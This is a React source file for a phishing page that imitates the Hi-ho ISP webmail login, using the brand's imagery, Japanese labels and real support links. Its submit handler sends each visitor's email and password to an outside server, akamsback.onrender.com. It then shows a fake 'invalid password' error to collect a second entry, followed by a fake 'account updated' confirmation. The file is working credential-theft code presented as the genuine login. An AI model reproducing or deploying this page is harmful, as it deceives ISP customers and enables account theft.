import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
import hiho_one from './hiho_one.gif';
import hiho_two from './hiho_two.gif';
import help from './help.gif';
import footer from './footer.gif';



function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Hi-ho")

    const[showError, setShowError] = useState(false);
    const[count, setCount] = useState(0);

    const[showSuccess, setShowSuccess] = useState(false);


    


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://akamsback.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200 && count < 1){
            console.log(response.data.message);
            setCount(count + 1);

            setShowError(true);
        }

      else if(response.status == 200 && count == 1){
        console.log(response.data.message);
            setCount(0);
            setShowError(false);
            setShowSuccess(true);
      }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}

    return (
        <>
            <nav className='mynav px-3 py-2'>
                <img className='navimage' src={hiho_one} />
                <img className='navimage' src={hiho_two} />
                <a href='http://hi-ho.jp/support/newmail_manual/'> <img className='help'src={help} /> <span className='mt-1 helptext'>ヘルプ
</span></a>

            </nav>

            <hr  />

                <div className='py-2'>

                </div>


                {email == "" ?  <div className='col-md-4 m-auto warning alert my-4 py-0'>
                <p className='warningtext'><b>【</b>お知らせ<b>】</b> <br/>ご案内はありません。</p>

            </div> : <div></div> }

            
           
                

            <div className='py-4'>

                </div>

                {showError && <div className="col-md-4 m-auto alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>無効なメールアドレスまたはパスワード</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            {showSuccess && <div className="col-md-4 m-auto alert alert-success alert-dismissible fade show" role="alert">
            <strong className='text-center'>正しいパスワードです。アカウントが更新されました。</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-4 m-auto p-0 '>
            

              

                <form onSubmit={handleSubmit}>

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">メールアドレス：</label></span>
                                                <div class="element"><input type="email"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">パスワード　　：</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>

                        <div className='form-group mt-3 text-center'>
                            <input type="checkbox"/> <span className='checktext'>次回からのメールアドレス入力を省略</span>

                        </div>


                    <div className='buttondiv py-4 text-center'>
                        <button className='mybutton checktext'type="submit">ログイン</button>

                    </div>



                </form>

                

            </div>
            
            <br/>

                <div className='alert alert-primary col-md-3 m-auto py-0'>
                    <p>※本サービスは、ハイホー接続会員向けのサービスになります。<br/> ※対応ブラウザ・対応携帯電話：<a href="http://hi-ho.jp/service/mail/webmail/">詳しくはこちら＞</a></p> 

                </div>

                <br/>

                <hr />

                <div className='text-right pr-3'>
                    <img className='footer 'src={footer} />

                </div>
        </>
    );

}

export default Home;